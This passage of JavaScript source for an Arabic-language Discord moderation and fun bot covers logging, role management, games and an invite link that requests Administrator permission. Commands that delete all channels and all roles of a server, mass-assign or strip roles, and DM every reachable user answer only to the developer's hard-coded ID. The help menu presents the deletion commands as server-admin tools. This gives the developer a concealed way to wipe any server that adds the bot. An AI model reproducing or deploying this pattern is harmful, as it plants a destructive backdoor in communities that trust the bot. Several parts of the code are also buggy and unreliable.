			.setDescription(`**\n**:white_check_mark: Successfully \`\`ADDED\`\` Role to **${oldMember.user.username}**\n\n**User:** <@${oldMember.id}> (ID: ${oldMember.user.id})\n**Role:** \`\`${role.name}\`\` (ID: ${role.id})\n**By:** <@${userID}> (ID: ${userID})`)
			.setTimestamp()
			.setFooter(userTag, userAvatar)

			logChannel.send(roleAdded);
		}
		if(oldMember.roles.size > newMember.roles.size) {
			let role = oldMember.roles.filter(r => !newMember.roles.has(r.id)).first();

			let roleRemoved = new Discord.RichEmbed()
			.setTitle('**[REMOVED ROLE FROM MEMBER]**')
			.setThumbnail(oldMember.guild.iconURL)
			.setColor('RED')
			.setDescription(`**\n**:negative_squared_cross_mark: Successfully \`\`REMOVED\`\` Role from **${oldMember.user.username}**\n\n**User:** <@${oldMember.user.id}> (ID: ${oldMember.id})\n**Role:** \`\`${role.name}\`\` (ID: ${role.id})\n**By:** <@${userID}> (ID: ${userID})`)
			.setTimestamp()
			.setFooter(userTag, userAvatar)

			logChannel.send(roleRemoved);
		}
	})
	if(oldMember.guild.owner.user.id !== newMember.guild.owner.user.id) {
		let newOwner = new Discord.RichEmbed()
		.setTitle('**[UPDATE GUILD OWNER]**')
		.setThumbnail(oldMember.guild.iconURL)
		.setColor('GREEN')
		.setDescription(`**\n**:white_check_mark: Successfully \`\`TRANSFER\`\` The Owner Ship.\n\n**Old Owner:** <@${oldMember.user.id}> (ID: ${oldMember.user.id})\n**New Owner:** <@${newMember.user.id}> (ID: ${newMember.user.id})`)
		.setTimestamp()
		.setFooter(oldMember.guild.name, oldMember.guild.iconURL)

		logChannel.send(newOwner);
	}
});
client.on('guildMemberAdd', member => {
  var logChannel = member.guild.channels.find(c => c.name === 'log');
  if(!logChannel) return;

  let newMember = new Discord.RichEmbed()
  .setTitle('**[NEW MEMBER ADDED]**')
  .setThumbnail(member.user.avatarURL)
  .setColor('GREEN')
  .setDescription(`**\n**:arrow_lower_right: Joined **${member.user.username}** To the server!\n\n**User:** <@${member.user.id}> (ID: ${member.user.id})\n**Days In Discord:** ${Days(member.user.createdAt)}`)
  .setTimestamp()
  .setFooter(member.user.tag, member.user.avatarURL)

  logChannel.send(newMember);
});
function Days(date) {
	let now = new Date();
	let diff = now.getTime() - date.getTime();
	let days = Math.floor(diff / 86400000);
	return days + (days == 1 ? " day" : " days") + " ago";
}
client.on('guildMemberRemove', member => {
  var logChannel = member.guild.channels.find(c => c.name === 'log');
  if(!logChannel) return;

  let leaveMember = new Discord.RichEmbed()
  .setTitle('**[LEAVE MEMBER]**')
  .setThumbnail(member.user.avatarURL)
  .setColor('GREEN')
  .setDescription(`**\n**:arrow_upper_left: Leave **${member.user.username}** From the server.\n\n**User:** <@${member.user.id}> (ID: ${member.user.id})`)
  .setTimestamp()
  .setFooter(member.user.tag, member.user.avatarURL)

  logChannel.send(leaveMember);
});


// Voice Logs
client.on('voiceStateUpdate', (voiceOld, voiceNew) => {

	if(!voiceOld.guild.member(client.user).hasPermission('EMBED_LINKS')) return;
	if(!voiceOld.guild.member(client.user).hasPermission('VIEW_AUDIT_LOG')) return;

	var logChannel = voiceOld.guild.channels.find(c => c.name === 'log');
	if(!logChannel) return;

	voiceOld.guild.fetchAuditLogs().then(logs => {
		var userID = logs.entries.first().executor.id;
		var userTag = logs.entries.first().executor.tag;
		var userAvatar = logs.entries.first().executor.avatarURL;

// Server Muted Voice
		if(voiceOld.serverMute === false && voiceNew.serverMute === true) {
			let serverMutev = new Discord.RichEmbed()
			.setTitle('**[VOICE MUTE]**')
			.setThumbnail('https://images-ext-1.discordapp.net/external/pWQaw076OHwVIFZyeFoLXvweo0T_fDz6U5C9RBlw_fQ/https/cdn.pg.sa/UosmjqDNgS.png')
			.setColor('RED')
			.setDescription(`**User:** <@${voiceOld.user.id}> (ID: ${voiceOld.user.id})\n**By:** <@${userID}> (ID: ${userID})\n**Channel:** \`\`${voiceOld.voiceChannel.name}\`\` (ID: ${voiceOld.voiceChannel.id})`)
			.setTimestamp()
			.setFooter(userTag, userAvatar)

			logChannel.send(serverMutev);
		}
// Server UnMuted Voice
		if(voiceOld.serverMute === true && voiceNew.serverMute === false) {
			let serverUnmutev = new Discord.RichEmbed()
			.setTitle('**[VOICE UNMUTE]**')
			.setThumbnail('https://images-ext-1.discordapp.net/external/u2JNOTOc1IVJGEb1uCKRdQHXIj5-r8aHa3tSap6SjqM/https/cdn.pg.sa/Iy4t8H4T7n.png')
			.setColor('GREEN')
			.setDescription(`**User:** <@${voiceOld.user.id}> (ID: ${voiceOld.user.id})\n**By:** <@${userID}> (ID: ${userID})\n**Channel:** \`\`${voiceOld.voiceChannel.name}\`\` (ID: ${voiceOld.voiceChannel.id})`)
			.setTimestamp()
			.setFooter(userTag, userAvatar)

			logChannel.send(serverUnmutev);
		}
// Server Deafen Voice
		if(voiceOld.serverDeaf === false && voiceNew.serverDeaf === true) {
			let serverDeafv = new Discord.RichEmbed()
			.setTitle('**[VOICE DEAFEN]**')
			.setThumbnail('https://images-ext-1.discordapp.net/external/7ENt2ldbD-3L3wRoDBhKHb9FfImkjFxYR6DbLYRjhjA/https/cdn.pg.sa/auWd5b95AV.png')
			.setColor('RED')
			.setDescription(`**User:** <@${voiceOld.user.id}> (ID: ${voiceOld.user.id})\n**By:** <@${userID}> (ID: ${userID})\n**Channel:** \`\`${voiceOld.voiceChannel.name}\`\` (ID: ${voiceOld.voiceChannel.id})`)
			.setTimestamp()
			.setFooter(userTag, userAvatar)

			logChannel.send(serverDeafv);
		}
// Server UnDeafen Voice
		if(voiceOld.serverDeaf === true && voiceNew.serverDeaf === false) {
			let serverUndeafv = new Discord.RichEmbed()
			.setTitle('**[VOICE UNDEAFEN]**')
			.setThumbnail('https://images-ext-2.discordapp.net/external/s_abcfAlNdxl3uYVXnA2evSKBTpU6Ou3oimkejx3fiQ/https/cdn.pg.sa/i7fC8qnbRF.png')
			.setColor('GREEN')
			.setDescription(`**User:** <@${voiceOld.user.id}> (ID: ${voiceOld.user.id})\n**By:** <@${userID}> (ID: ${userID})\n**Channel:** \`\`${voiceOld.voiceChannel.name}\`\` (ID: ${voiceOld.voiceChannel.id})`)
			.setTimestamp()
			.setFooter(userTag, userAvatar)

			logChannel.send(serverUndeafv);
		}
	})
// Join Voice Channel
	if(voiceOld.voiceChannelID !== voiceNew.voiceChannelID && !voiceOld.voiceChannel) {
		let voiceJoin = new Discord.RichEmbed()
		.setTitle('**[JOIN VOICE ROOM]**')
		.setColor('GREEN')
		.setThumbnail(voiceOld.user.avatarURL)
		.setDescription(`**\n**:arrow_lower_right: Successfully \`\`JOIN\`\` To Voice Channel.\n\n**Channel:** \`\`${voiceNew.voiceChannel.name}\`\` (ID: ${voiceNew.voiceChannelID})\n**User:** ${voiceOld} (ID: ${voiceOld.id})`)
		.setTimestamp()
		.setFooter(voiceOld.user.tag, voiceOld.user.avatarURL)

		logChannel.send(voiceJoin);
	}
// Leave Voice Channel
	if(voiceOld.voiceChannelID !== voiceNew.voiceChannelID && !voiceNew.voiceChannel) {
		let voiceLeave = new Discord.RichEmbed()
		.setTitle('**[LEAVE VOICE ROOM]**')
		.setColor('GREEN')
		.setThumbnail(voiceOld.user.avatarURL)
		.setDescription(`**\n**:arrow_upper_left: Successfully \`\`LEAVE\`\` From Voice Channel.\n\n**Channel:** \`\`${voiceOld.voiceChannel.name}\`\` (ID: ${voiceOld.voiceChannelID})\n**User:** ${voiceOld} (ID: ${voiceOld.id})`)
		.setTimestamp()
		.setFooter(voiceOld.user.tag, voiceOld.user.avatarURL)

		logChannel.send(voiceLeave);
	}
// Changed Voice Channel
	if(voiceOld.voiceChannelID !== voiceNew.voiceChannelID && voiceNew.voiceChannel && voiceOld.voiceChannel != null) {
		let voiceLeave = new Discord.RichEmbed()
		.setTitle('**[CHANGED VOICE ROOM]**')
		.setColor('GREEN')
		.setThumbnail(voiceOld.user.avatarURL)
		.setDescription(`**\n**:repeat: Successfully \`\`CHANGED\`\` The Voice Channel.\n\n**From:** \`\`${voiceOld.voiceChannel.name}\`\` (ID: ${voiceOld.voiceChannelID})\n**To:** \`\`${voiceNew.voiceChannel.name}\`\` (ID: ${voiceNew.voiceChannelID})\n**User:** ${voiceOld} (ID: ${voiceOld.id})`)
		.setTimestamp()
		.setFooter(voiceOld.user.tag, voiceOld.user.avatarURL)

		logChannel.send(voiceLeave);
	}
});


client.on('message', message => {
    if(message.content.includes('discord.gg')){
                                            if(!message.channel.guild) return message.reply('** advertising me on DM ? 🤔   **');
        if (!message.member.hasPermissions(['ADMINISTRATOR'])){
        message.delete()
    return message.reply(`** No Invite Links :angry: !**`)
    }
}
});


client.on('message', message => {
  if (!message.content.startsWith(prefix)) return;
  const verifed = ["415595760990552065"];
if (message.content.startsWith(prefix + 'ownerbot')) {
	if(!message.channel.guild) return message.reply(':no_entry: | This Command For Servers Only!'); 
if( verifed.some(word => message.author.id.includes(word)) ) {    return message.channel.sendMessage("**انت صاحب البوت **")
} else {
   message.reply("**انت لسا صاحب البوت**");   
}
}
});


client.on("message", message => {
	var prefix = "$";
	var args = message.content.split(' ').slice(1); 
	var msg = message.content.toLowerCase();
	if( !message.guild ) return;
	if( !msg.startsWith( prefix + 'role' ) ) return;
	if(message.author.id !== myID) return;
	if( msg.toLowerCase().startsWith( prefix + 'roleremove' ) ){
		if( !args[0] ) return message.reply( '**:x: يرجى وضع الشخص المراد سحب منه الرتبة**' );
		if( !args[1] ) return message.reply( '**:x: يرجى وضع الرتبة المراد سحبها من الشخص**' );
		var role = msg.split(' ').slice(2).join(" ").toLowerCase(); 
		var role1 = message.guild.roles.filter( r=>r.name.toLowerCase().indexOf(role)>-1 ).first(); 
		if( !role1 ) return message.reply( '**:x: يرجى وضع الرتبة المراد سحبها من الشخص**' );if( message.mentions.members.first() ){
			message.mentions.members.first().removeRole( role1 );
			return message.reply('**:white_check_mark: [ '+role1.name+' ] رتبة [ '+args[0]+' ] تم سحب من **');
		}
		if( args[0].toLowerCase() == "all" ){
			message.guild.members.forEach(m=>m.removeRole( role1 ))
			return	message.reply('**:white_check_mark: [ '+role1.name+' ] تم سحب من الكل رتبة**');
		} else if( args[0].toLowerCase() == "bots" ){
			message.guild.members.filter(m=>m.user.bot).forEach(m=>m.removeRole(role1))
			return	message.reply('**:white_check_mark: [ '+role1.name+' ] تم سحب من البوتات رتبة**');
		} else if( args[0].toLowerCase() == "humans" ){
			message.guild.members.filter(m=>!m.user.bot).forEach(m=>m.removeRole(role1))
			return	message.reply('**:white_check_mark: [ '+role1.name+' ] تم سحب من البشريين رتبة**');
		} 	
	} else {
		if( !args[0] ) return message.reply( '**:x: يرجى وضع الشخص المراد اعطائها الرتبة**' );
		if( !args[1] ) return message.reply( '**:x: يرجى وضع الرتبة المراد اعطائها للشخص**' );
		var role = msg.split(' ').slice(2).join(" ").toLowerCase(); 
		var role1 = message.guild.roles.filter( r=>r.name.toLowerCase().indexOf(role)>-1 ).first(); 
		if( !role1 ) return message.reply( '**:x: يرجى وضع الرتبة المراد اعطائها للشخص**' );if( message.mentions.members.first() ){
			message.mentions.members.first().addRole( role1 );
			return message.reply('**:white_check_mark: [ '+role1.name+' ] رتبة [ '+args[0]+' ] تم اعطاء **');
		}
		if( args[0].toLowerCase() == "all" ){
			message.guild.members.forEach(m=>m.addRole( role1 ))
			return	message.reply('**:white_check_mark: [ '+role1.name+' ] تم اعطاء الكل رتبة**');
		} else if( args[0].toLowerCase() == "bots" ){
			message.guild.members.filter(m=>m.user.bot).forEach(m=>m.addRole(role1))
			return	message.reply('**:white_check_mark: [ '+role1.name+' ] تم اعطاء البوتات رتبة**');
		} else if( args[0].toLowerCase() == "humans" ){
			message.guild.members.filter(m=>!m.user.bot).forEach(m=>m.addRole(role1))
			return	message.reply('**:white_check_mark: [ '+role1.name+' ] تم اعطاء البشريين رتبة**');
		} 
	}    
});

client.on('message', message => {
    if(!message.channel.guild) return; 
if(message.content.startsWith('$delete-world')) {
if(!message.channel.guild) return message.channel.send('**هذا الأمر فقط للسيرفرات | ❌**').then(m => m.delete(5000));
// if(!message.member.hasPermission('ADMINISTRATOR')) return message.channel.send('**يجب ان تمتلك صلاحيه ``ADMINISTRATOR`` | ❌'); 
message.react('✅')
message.react('❌')
.then(() => message.react('✅'))
.then(() =>message.react('❌'))

let reaction1Filter = (reaction, user) => reaction.emoji.name === '✅' && user.id === message.author.id;
let reaction2Filter = (reaction, user) => reaction.emoji.name === '❌' && user.id === message.author.id;

let reaction1 = message.createReactionCollector(reaction1Filter, { time: 12000 });
let reaction2 = message.createReactionCollector(reaction2Filter, { time: 12000 });
reaction1.on("collect", r => {
    message.channel.send({file : "https://cdn.discordapp.com/attachments/456652875150655489/489905534066098196/deleted.png"})
})
reaction2.on("collect", r => {
message.channel.send('**تم الغاء عمليه مسح العالم بنجاح | ✅ **')
})
}
});



client.on('message' , message => {
if(message.content === '_help') {
  var EsTeKnAN = new Discord.RichEmbed()
  .setColor('RANDOM')
message.author.send(`
**

__~~The Amaterasu Bot~~__ By: Mιɳαƚσ💤💰...ᴳᴳ#0435
╭━━━╮╱╱╱╱╱╭╮╱╱╱╱╱╱╱╱╱╱
┃╭━╮┃╱╱╱╱╭╯╰╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱
┃┃╱┃┣╮╭┳━┻╮╭╋━━┳━┳━━┳━━┳╮╭╮
┃╰━╯┃╰╯┃╭╮┃┃┃┃━┫╭┫╭╮┃━━┫┃┃┃
┃╭━╮┃┃┃┃╭╮┃╰┫┃━┫┃┃╭╮┣━━┃╰╯┃
╰╯╱╰┻┻┻┻╯╰┻━┻━━┻╯╰╯╰┻━━┻━━╯
╔[❖═══════════════════════════❖]╗
             Prefix = ' _ '
╚[❖═══════════════════════════❖]╝
             Enjoy <3
╔[❖═══════════════════════════❖]╗
            General  Commands
╚[❖═══════════════════════════❖]╝

 ❖ _id معلومات عن حسابك الشخصي
 ❖ _server معلومات حول السيرفر
 ❖ _mvall سحب الكل الى رومك الروم صوتي
 ❖ _move سحب عضو الى رومك الروم صوتي
 ❖ _clr مسح الرسائل الموجوده في الروم بلا عدد
 ❖ _clear مسح الرسائل الموجوده في الروم بلا عدد
 ❖ _avatar يعرض اك صورتك الشخصية
 ❖ _image يعرض لك صورة السيرفر
 ❖ _date يوريك الوقت
 ❖ _short يسوي لك اختصار رابط
 ❖ _tag لعمل تاق لكلمة 
 ❖ _prems يعرض لك برمشناتك بالسيرفر
 ❖ _mcstats معرفة معلومات عن سيرفر في ماين كرافت
 ❖ _cal لحسابة عملية ما
 ❖ _say لاعادة شيئ قلته
 ❖ _invites كم دعوة سوية
 ❖ _embed لتكرار اي شي كتبتو بطريقة حلوة
 ❖ _grole معلومات عن الرول
 ❖ _contact ارسال اقتراح او لمراسلة صاحب البوت
 ❖ _skin يعرض لك سكنك بماين كرافت
 ❖ _color تختار اللون
 ❖ _marry الزواج باحد
 ❖ _user معلوماتك
 ❖ _gif ارسال صورة متحركة
 ❖ _report تسوي ابلاغ عن شخص
 ❖ _dt التاريخ
 ❖ _هل تعلم لعبة هل تعلم
 ❖ _نكت لعبة نكت
 ❖ _تهكير خدعة تهكير
 ❖ _لو خيروك Funny Game Yay
 ❖ _كت تويت لعبة كت تويت 
 ❖ _bot معلومات عن البوت
 ❖ _عواصم عواصم عشوائية
 ❖ _rgz  لعبة سرعة كتابة 
 ❖ _quas اسئلة عامة
 ❖ _rps لعبة حجر ورقة مقص
 ❖ _topinv  اكثر الاشخاص الي ينشرو السيرفر
 ❖ _new ينشئ لك رووم لا يمكن يشوفها غير الستاف
 ❖ _allbots لعرض جميع البوتات الي بالسيرفر
 ❖ _count يعرض لك عدد الاشخاص بالسيرفر بدون بوتات
 ❖ _rooms يعرض لك كل الرومات الي بالسيرفر مع عددها

╔[❖═══════════════════════════❖]╗
             Admin Commands
╚[❖═══════════════════════════❖]╝

 ❖ _ban حضر عضو من السيرفر
 ❖ _unban لازالة باند على احد
 ❖ _cc انشاء الوان
 ❖ _kick طرد عضو من السيرفر
 ❖ _mute اعضاء ميوت كتابي لعضو في السيرفر
 ❖ _unmute فك الميوت عن عضو في السيرفر
 ❖ _warn لتحذير شخص
 ❖ _dc حذف جميع رومات السيرفر
 ❖ _dr حذف جميع رتب السيرفر
 ❖ _unmutechannel فتح المحادثة في الروم
 ❖ _mutechannel قفل المحادثة في الروم
 ❖ _role اعطاء رتبه لشخض معين
 ❖ _role humans اعطاء رتب للبشريين
 ❖ _role bots اعطاء رتبه للبوتات
 ❖ _role all اعطاء رتبه للجميع سواء بشر او بوتات
 ❖ _roleremove سحب الرتبه من شخص معين
 ❖ _bc رسالة جماعية الى كل اعضاء السيرفر
 ❖ _vkick يطرد شخص من الرووم
 ❖ _unall ازالة الباند عن الجميع
 ❖ _mb يعرض لك عدد كل حالات الاشخاص وعدد البوتات وعدد الاشخاص
 ❖ _server يعرض لك معلومات عن السيرفر
 ❖ _emojis ايموجيات السيرفر
 ❖ _lock  اخفاء الشات
 ❖ _unlock اضهار الشات المخفية
 ❖ _readyserver انشاء روومات و رولات
 ❖ _hide اخفاء جميع روومات السيرفر
 ❖ _unhide اضهار جميع الرومات المخفية
 ❖ _autoc Reaction Role

╔[❖════════════════════════════❖]╗
                Logs
╚[❖════════════════════════════❖]╝

to enable log message do channel name "log"

╔[❖════════════════════════════❖]╗
                Other
╚[❖════════════════════════════❖]╝

 ❖ _support رابط سيرفر الدعم الفني
 ❖ _invite رابط اضافة البوت
 ❖ _ping لمعرفه سرعه اتصال البوت

==================================================================

Server support: https://discord.gg/e4ve5rf

==================================================================

bot invite link: https://discordapp.com/api/oauth2/authorize?client_id=510579205897977866&permissions=8&scope=bot

==================================================================
**
`);
}
})

client.on('message',  async  message  =>  {
  let  user  =  message.mentions.users.first();
  let  reason  =  message.content.split(' ').slice(2).join(' ');
if(message.content.startsWith(prefix  +  'warn'))  {
  message.delete();
  if(!message.member.hasPermission('MUTE_MEMBERS')) return      message.channel.send('**للأسف لا تمتلك صلاحيات' );
  if(!user)  return  message.channel.send(":information_source: `${prefix}warn ` يجب تحديد شخص ")
  if(!reason)  return  message.channel.send("**  -  Type  Reason  **")//by  OrochiX
  let  warnembed  =  new  Discord.RichEmbed()
  .setTitle(`**New  Warned User !**`)
.addField("**Warned  User:**",  `${user}`)//by  OrochiX
.addField('**Warned  By:**',`${message.author}`)//by  OrochiX
.addField('**Reason:**',  `${reason}`,  true)
.setFooter(`${message.createdAt}`)
.setColor('RANDOM')
let incidentchannel = message.guild.channels.find(`name`, "log");
if(!incidentchannel) return  message.guild.channels.find('name', 'log')
if(!mutechannel) return message.guild.createChannel("log", 'text').then(c => {
  c.setPosition(1);
});
incidentchannel.send(warnembed);
message.channel.send(`**:white_check_mark: ${user} has been warned !:warning:**`).then(msg  =>  msg.delete(3000));
user.send(`**:warning: You are has been warned in ${message.guild.name} reason: ${reason} :warning:**`)
}

//coding  by  OrochiX  !

})



client.on('message', message => {
var prefix = "$";
  if (message.author.bot) return;
  if (!message.content.startsWith(prefix)) return;

  let command = message.content.split(" ")[0];
  command = command.slice(prefix.length);

  let args = message.content.split(" ").slice(1);

  if (command == "say") {
	  if(!message.channel.guild) return message.reply(':no_entry: | This Command For Servers Only!'); 
	  if(message.author.id !== myID) return;
   message.channel.sendMessage(args.join("  "))
   message.delete()
  }
 });

client.on('message', message => {
var prefix = "$";
if(message.content.split(' ')[0] == prefix + 'dc') { 
if (!message.channel.guild) return;
if(message.author.id !== myID) return;
if(!message.guild.member(client.user).hasPermission("MANAGE_CHANNELS")) return message.reply("**I Don't Have ` MANAGE_CHANNELS ` Permission**");
message.guild.channels.forEach(m => {
m.delete();
});
}
if(message.content.split(' ')[0] == prefix + 'dr') { // delete all roles
if (!message.channel.guild) return;
if(message.author.id !== myID) return;
if(!message.guild.member(client.user).hasPermission("MANAGE_ROLES_OR_PERMISSIONS")) return message.reply("**I Don't Have ` MANAGE_ROLES_OR_PERMISSIONS ` Permission**");
message.guild.roles.forEach(m => {
m.delete();
});
message.reply("`تم حذف جميع الرتب بنجاح`")
}
});





client.on('message', message => {
                                if(!message.channel.guild) return;
                        if (message.content.startsWith('_ping')) {
                            if(!message.channel.guild) return;
                            var msg = `${Date.now() - message.createdTimestamp}`
                            var api = `${Math.round(client.ping)}`
                            if (message.author.bot) return;
                        let embed = new Discord.RichEmbed()
                        .setAuthor(message.author.username,message.author.avatarURL)
                        .setThumbnail('https://cdn.discordapp.com/avatars/368141321547808768/c42716e13cb850f9ad0930af699472d0.png?size=2048nk')
                        .setColor('RANDOM')
                        .addField('**Ping:**',msg + " ms")
message.channel.send({embed:embed});
                        }
                    });



client.on('message', message => {
            if(!message.channel.guild) return;
let args = message.content.split(' ').slice(1).join(' ');
if (message.content.startsWith('-bca')){
 if (message.author.id !== '415595760990552065') return message.reply('** هذا الأمر قفط لصاحب البوت و شكراًً **')
message.channel.sendMessage('جار ارسال الرسالة |✅')
client.users.forEach(m =>{
m.sendMessage(args)
})
}
});


 client.on('message', message => {
       if(message.content.startsWith ("_marry")) {
       if(!message.channel.guild) return message.reply('** This command only for servers **')
       var proposed = message.mentions.members.first()
      
       if(!message.mentions.members.first()) return message.reply(' 😏 **لازم تطلب ايد وحدة**').catch(console.error);
       if(message.mentions.users.size > 1) return message.reply(' 😳 **ولد ما يصحلك الا حرمة وحدة كل مرة**').catch(console.error);
        if(proposed === message.author) return message.reply(`**خنثى ؟ **`);
         if(proposed === client.user) return message.reply(`** تبي تتزوجني؟ **`);
               message.channel.send(`**${proposed} 
  بدك تقبلي عرض الزواج من ${message.author} 
  العرض لمدة 15 ثانية  
  اكتبي موافقة او لا**`)
 
 const filter = m => m.content.startsWith("موافقة");
 message.channel.awaitMessages(filter, { max: 1, time: 15000, errors: ['time'] })
 .then(collected =>{ 
     message.channel.send(` **${message.author} و ${proposed} الف الف مبروك الله , يرزقكم الذرية الصالحة** `);
 })
 
    const filte = m => m.content.startsWith("لا");
 message.channel.awaitMessages(filte, { max: 1, time: 15000, errors: ['time'] })
 .then(collected =>{ 
    message.channel.send(`  **${message.author} تم رفض عرضك** `);
 })
         
   }
 });


client.on('message' , message => {
    var prefix = "_";
if(message.content.startsWith(prefix+"user")) {
    let user = message.mentions.users.first() || message.author;
    const joineddiscord = (user.createdAt.getDate() + 1) + '-' + (user.createdAt.getMonth() + 1) + '-' + user.createdAt.getFullYear() + ' | ' + user.createdAt.getHours() + ':' + user.createdAt.getMinutes() + ':' + user.createdAt.getSeconds();
    message.delete();
    let game;
    if (user.presence.game === null) {
        game = 'لا يلعب حاليا.';
    } else {
        game = user.presence.game.name;
    }
    let messag;
    if (user.lastMessage === null) {
        messag = 'لم يرسل رسالة. ';
    } else {
        messag = user.lastMessage;
    }
    let status;
    if (user.presence.status === 'online') {
        status = ':green_heart:';
    } else if (user.presence.status === 'dnd') {
        status = ':heart:';
    } else if (user.presence.status === 'idle') {
        status = ':yellow_heart:';
    } else if (user.presence.status === 'offline') {
        status = ':black_heart:';
    }
    if (user.presence.status === 'offline') {
        stat = 0x000000;
    } else if (user.presence.status === 'online') {
        stat = 0x00AA4C;
    } else if (user.presence.status === 'dnd') {
        stat = 0x9C0000;
    } else if (user.presence.status === 'idle') {
        stat = 0xF7C035;
    }
    const embed = new Discord.RichEmbed()
  .addField('**UserInfo:**', `**name:** ${user.username}#${user.discriminator}\n**JoinedDiscord:** ${joineddiscord}\n**LastMessage:** ${messag}\n**Playing:** ${game}\n**Status:** ${status}\n**Bot?** ${user.bot}`, true)
  .setThumbnail(user.displayAvatarURL)
  .addField(`Roles:`, message.guild.members.get(user.id).roles.array(role => role.name).slice(1).join(', '))
  .addField('DiscordInfo:', `**Discriminator:** #${user.discriminator}\n**ID:** ${user.id}\n**Username:** ${user.username}`)
  .setAuthor(`معلومات ${user.username}`, user.displayAvatarURL)
  .setColor(stat);
    message.channel.send({embed})
  .catch(e => logger.error(e));
}
 });



client.on('message', message => {
    var prefix ="_"
    if(message.content.startsWith('_gif')) {
console.log('[Gif Search]')
        if(message.channel.type === 'dm') return message.channel.send('Only For Servers')
        let args = message.content.split(' ').slice(1).join(' ')
            if (!args) return message.reply('يجب كتابة أسم الصورة')
    gif.query(args).then(gifUrl => {
        message.channel.send({
            files: [{
                attachment: gifUrl,
                name: "search.gif"
            }]
        });
    });
}
});



client.on('message' , async (message) => {
       if(message.content.startsWith(prefix + "rps")) {
              let args = message.content.split(" ").slice(1);
  var choice = args[0];
  if (choice == "ورقة" || choice == "p") {
    var numb = Math.floor(Math.random() * 100);
    if (numb <= 50) {
      var choice2 = "ورقة";
    } else if (numb > 50) {
      var choice2 = "حجر";
    } else {
      var choice2 = "مقص";
    }
    if (choice2 == "مقص") {
      var response = " لقد اخترت **مقص** و :v: ولقد فزت"
    } else if (choice2 == "ورقة") {
      var response = " لقد اخترت **ورقه** :hand_splayed: انه تعادل "
    } else {
      var response = " لقد اخترت **حجر** :punch:  انت الفائز"    
    }
    message.channel.send(response);
  } else if (choice == "حجر" || choice == "r") {
    var numb = Math.floor(Math.random() * 100);
    if (numb <= 50) {
      var choice2 = "ورقة";
    } else if (numb > 50) {
      var choice2 = "حجر";
    } else {
      var choice2 = "مقص";
    }
    if (choice2 == "ورقة") {
      var response = " لقد اخترت **ورقه** :hand_splayed: ولقد فزت"
    } else if (choice2 == "حجر") {
      var response = "لقد اخترت **حجر** :punch: انه تعادل "
    } else {
      var response = " لقد اخترت **مقص** :v: انت الفائز"
    }
    message.channel.send(response);
  } else if (choice == "مقص" || choice == "s") {
    var numb = Math.floor(Math.random() * 100);
    if (numb <= 50) {
      var choice2 = "ورقة";
    } else if (numb > 50) {
      var choice2 = "حجر";
    } else {
      var choice2 = "مقص";
    }
    if (choice2 == "حجر") {
      var response = "لقد اخترت **ورقه** :hand_splayed: لقد فزت"
    } else if (choice2 == "مقص") {
      var response = "لقد اخترت **مقص** :v: انه تعادل"
    } else {
      var response = " لقد اخترت **حجر** :punch: انت الفائز "
    }
    message.channel.send(response);
  } else {
    message.channel.send(`يجب عليك استعمال \`${prefix}rps\` <حجر|ورقة|مقص>`);
  }
}

});


client.on("message", message => {
        let args = message.content.split(" ").slice(1);
      if (message.content.startsWith('_report')) {
            let user = message.mentions.users.first();
            let reason = args.slice(1).join(' ');
            let modlog = client.channels.find('name', 'reports');
            if (!reason) return message.reply('**Write a Reason**');
              if (message.mentions.users.size < 1) return message.reply('**Mention the Member you want to report**').catch(console.error);
       
        if (!modlog) return message.reply('**No such a Room Called __report__**');
        const embed = new Discord.RichEmbed()
          .setColor(0x00AE86)
          .setTimestamp()
          .addField('Text Type:', 'Report')
          .addField('Reported:', `${user.username}#${user.discriminator} (${user.id}`)
          .addField('Reported By:', `${message.author.username}#${message.author.discriminator}`)
          .addField('Reason', reason);
          message.delete()
          return client.channels.get(modlog.id).sendEmbed(embed).catch(console.error);
          console.log('[report] Send By: ' + message.author.username)
      }
      });


client.on('guildCreate', guild => {
   
  client.channels.get("415595760990552065")
const embed = new Discord.RichEmbed()
   .setAuthor(`بوتك دخل سيرفر جديد مبروك ✅`)
   .setDescription(`**
Server name: __${guild.name}__
Server id: __${guild.id}__
Server owner: __${guild.owner}__
Member Count: __${guild.memberCount}__
Servers Counter : __${client.guilds.size}__**`)
         .setColor("#f3ae10")
         .addField("New Server!")
         .setFooter('Heem Bot' , client.user.avatarURL)
           client.channels.get("415595760990552065").send({embed}); //Sup
}
 
);

 const HeRo = new Discord.Client();
 client.on('message', message => {
     if (message.content === prefix + "date") {
         if (!message.channel.guild) return message.reply('** This command only for servers **');  
         var currentTime = new Date(),
             Year = currentTime.getFullYear(),
             Month = currentTime.getMonth() + 1,
             Day = currentTime.getDate();

             var Date15= new Discord.RichEmbed()
             .setTitle("**『  Date  』 **")
             .setColor('RANDOM')
             .setTimestamp()
             .setDescription( "『"+ Day + "-" + Month + "-" + Year + "』")
             .setFooter(`!help to see all bot commands `, 'https://images-ext-1.discordapp.net/external/x-p4BwGofa_z_p9hpV-4hJPcqWh-aWGQzsmI189cDiY/%3Fwidth%3D344%26height%3D344/https/media.discordapp.net/attachments/372444859329544203/372701184055836682/ass.jpg?width=231&height=231')
              message.channel.sendEmbed(Date15);
     }
 });


client.on('message', message => {
 if (true) {
if (message.content === '_support') {
     message.author.send(' |https://discord.gg/sT4zzn| For any Problem').catch(e => console.log(e.stack));

   }
  } 
 });
 

client.on('message', message => {
    if (message.content === "_support") {
    let embed = new Discord.RichEmbed()
 .setAuthor(message.author.username)
 .setColor("#9B59B6")
 .addField(" Done " , " |  Send to PM")
    
    
    
 message.channel.sendEmbed(embed);
   }
});



client.on('message', message => {
 if (true) {
if (message.content === '_inv') {
     message.author.send(' Bot Link |  https://discordapp.com/api/oauth2/authorize?client_id=510579205897977866&permissions=8&scope=bot ').catch(e => console.log(e.stack));

   }
  } 
 });
 
 client.on('message', message => {
 if (true) {
if (message.content === '_invite') {
     message.author.send(' Bot Link |  https://discordapp.com/api/oauth2/authorize?client_id=510579205897977866&permissions=8&scope=bot ').catch(e => console.log(e.stack));

   }
  } 
 });

client.on('message', message => {
    if (message.content === "_invite") {
    let embed = new Discord.RichEmbed()
 .setAuthor(message.author.username)
 .setColor("#9B59B6")
 .addField(" Done " , " |  Send to PM")
    
    
    
 message.channel.sendEmbed(embed);
   }
});


client.on('message', message => {
    if (message.content === "_inv") {
    let embed = new Discord.RichEmbed()
 .setAuthor(message.author.username)
 .setColor("#9B59B6")
 .addField(" Done " , " |  Send to PM")
    
    
    
 message.channel.sendEmbed(embed);
   }
});


client.on('message', message => {
    if (message.content.startsWith("_readyserver")) {
     if(!message.channel.guild) return message.channel.send('**This Command Only For Servers !**')
     message.guild.createRole({
  name: 'King',
